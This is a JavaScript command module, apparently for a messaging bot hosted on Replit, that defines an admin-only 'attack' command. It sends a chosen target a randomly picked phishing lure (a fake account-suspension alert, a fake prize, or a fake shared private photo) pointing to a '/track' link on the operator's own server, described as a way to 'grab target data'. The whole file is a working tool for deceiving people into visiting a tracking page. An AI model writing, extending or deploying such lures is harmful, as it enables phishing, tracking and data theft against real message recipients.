const { isAdmin } = require('../utils/auth');

module.exports = {
    name: 'attack',
    description: 'Grab target data by sending a message.',
    async execute(client, message, args) {
        if (!isAdmin(client, message)) {
            return message.reply('❌ Admin access required.');
        }

        try {
            const domain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS || '';
            if (!domain) {
                return message.reply("❌ Error: Could not determine server URL.");
            }

            const trackerUrl = `https://${domain}/track`;
            
            const attackMessages = [
                `🚨 *URGENT SECURITY ALERT* 🚨\n\nYour account has been flagged for suspicious activity. Please verify your identity immediately to avoid permanent suspension:\n\n🔗 ${trackerUrl}`,
                `🎁 *CONGRATULATIONS!* 🎁\n\nYou've won a premium subscription! Claim your reward now before the link expires:\n\n🔗 ${trackerUrl}`,
                `📸 *NEW PHOTO SHARED* 📸\n\nSomeone just shared a private photo with you. View it here:\n\n🔗 ${trackerUrl}`
            ];

            const selectedMsg = attackMessages[Math.floor(Math.random() * attackMessages.length)];
            
            const target = message.fromMe ? message.to : message.from;
            await client.sendMessage(target, selectedMsg);

        } catch (error) {
            console.error('Attack Command Error:', error);
            message.reply("❌ Error executing attack command.");
        }
    }
};